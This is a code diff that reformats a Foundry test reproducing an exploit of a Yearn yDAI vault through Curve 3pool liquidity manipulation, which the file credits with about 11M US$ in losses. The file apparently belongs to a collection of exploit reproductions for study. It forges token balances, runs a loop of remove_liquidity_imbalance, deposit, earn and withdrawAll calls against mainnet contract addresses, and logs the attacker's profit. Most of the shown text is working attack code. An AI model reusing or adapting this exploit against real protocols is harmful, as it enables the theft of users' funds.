@@ -4,9 +4,9 @@ pragma solidity >=0.7.0 <0.9.0;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
-import {SafeERC20 as TransferHelper} from "OpenZeppelin/token/ERC20/utils/SafeERC20.sol";
+import {SafeERC20 as TransferHelper} from "src/token/ERC20/utils/SafeERC20.sol";
 //Converted to foundry test from this file https://gist.github.com/xu3kev/cb1992269c429647d24b6759aff6261c
 
 // @KeyInfo - Total Lost : ~11M US$
@@ -23,27 +23,29 @@ import {SafeERC20 as TransferHelper} from "OpenZeppelin/token/ERC20/utils/SafeER
 // Twitter Guy : https://www.google.com/
 
 interface ICurve {
-
-    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
-    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
-    function remove_liquidity(uint256 token_amount, uint256[3] memory min_amounts)
-        external
-        returns (uint256[3] memory);
+    function add_liquidity(
+        uint256[3] memory amounts,
+        uint256 min_mint_amount
+    ) external;
+    function remove_liquidity_imbalance(
+        uint256[3] memory amounts,
+        uint256 max_burn_amount
+    ) external;
+    function remove_liquidity(
+        uint256 token_amount,
+        uint256[3] memory min_amounts
+    ) external returns (uint256[3] memory);
     function get_virtual_price() external view returns (uint256 out);
-
 }
 
 interface IYVDai {
-
     function balanceOf(address) external view returns (uint256);
     function deposit(uint256 _amount) external;
     function earn() external;
     function withdrawAll() external;
-
 }
 
 contract Exploit is Test {
-
     using stdStorage for StdStorage;
 
     IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
@@ -71,8 +73,16 @@ contract Exploit is Test {
         // Approvals and initialization logic goes here
     }
 
-    function writeTokenBalance(address who, address token, uint256 amt) internal {
-        stdstore.target(token).sig(IERC20(token).balanceOf.selector).with_key(who).checked_write(amt);
+    function writeTokenBalance(
+        address who,
+        address token,
+        uint256 amt
+    ) internal {
+        stdstore
+            .target(token)
+            .sig(IERC20(token).balanceOf.selector)
+            .with_key(who)
+            .checked_write(amt);
     }
 
     function setUp() public {
@@ -86,12 +96,20 @@ contract Exploit is Test {
         require(max_earn_amt > 0, "0 is max amt?");
 
         //Initialize initial token balances
-        writeTokenBalance(address(this), address(dai), init_add_dai_amt + max_earn_amt);
+        writeTokenBalance(
+            address(this),
+            address(dai),
+            init_add_dai_amt + max_earn_amt
+        );
         writeTokenBalance(address(this), address(usdc), init_add_usdc_amt);
 
         //Approvals
         dai.approve(address(yvdai), type(uint256).max);
-        TransferHelper.safeIncreaseAllowance(usdt, address(curve), type(uint256).max);
+        TransferHelper.safeIncreaseAllowance(
+            usdt,
+            address(curve),
+            type(uint256).max
+        );
         dai.approve(address(curve), type(uint256).max);
         usdc.approve(address(curve), type(uint256).max);
     }
@@ -109,7 +127,10 @@ contract Exploit is Test {
 
         // Exploit loop
         for (uint256 i = 0; i < 5; i++) {
-            curve.remove_liquidity_imbalance([0, 0, remove_usdt_amt], max_3crv_amount);
+            curve.remove_liquidity_imbalance(
+                [0, 0, remove_usdt_amt],
+                max_3crv_amount
+            );
 
             yvdai.deposit(earn_amt[i]);
             yvdai.earn();
@@ -124,17 +145,40 @@ contract Exploit is Test {
         }
 
         // Convert some 3crv
-        uint256 dai_difference = hacker_dai_amt_before - dai.balanceOf(address(this));
-        curve.remove_liquidity_imbalance([dai_difference + 1, init_add_usdc_amt + 1, 0], max_3crv_amount);
-        require(dai.balanceOf(address(this)) == hacker_dai_amt_before + 1, "incorrect dai bal after attack");
-        require(usdc.balanceOf(address(this)) == hacker_usdc_amt_before + 1, "incorrect usdc amount after attack");
+        uint256 dai_difference = hacker_dai_amt_before -
+            dai.balanceOf(address(this));
+        curve.remove_liquidity_imbalance(
+            [dai_difference + 1, init_add_usdc_amt + 1, 0],
+            max_3crv_amount
+        );
+        require(
+            dai.balanceOf(address(this)) == hacker_dai_amt_before + 1,
+            "incorrect dai bal after attack"
+        );
+        require(
+            usdc.balanceOf(address(this)) == hacker_usdc_amt_before + 1,
+            "incorrect usdc amount after attack"
+        );
 
         //Lets give back our initial funding to see real profit
-        writeTokenBalance(address(this), address(dai), dai.balanceOf(address(this)) - hacker_dai_amt_before);
-        writeTokenBalance(address(this), address(usdc), usdc.balanceOf(address(this)) - hacker_usdc_amt_before);
+        writeTokenBalance(
+            address(this),
+            address(dai),
+            dai.balanceOf(address(this)) - hacker_dai_amt_before
+        );
+        writeTokenBalance(
+            address(this),
+            address(usdc),
+            usdc.balanceOf(address(this)) - hacker_usdc_amt_before
+        );
         //This is attacker profit, Only does one run to show it
-        console.log("Attacker get 3crv amt: %d", crv3.balanceOf(address(this)) / 1e18);
-        console.log("Attacker get usdt amt: %d", usdt.balanceOf(address(this)) / 1e6);
+        console.log(
+            "Attacker get 3crv amt: %d",
+            crv3.balanceOf(address(this)) / 1e18
+        );
+        console.log(
+            "Attacker get usdt amt: %d",
+            usdt.balanceOf(address(this)) / 1e6
+        );
     }
-
 }
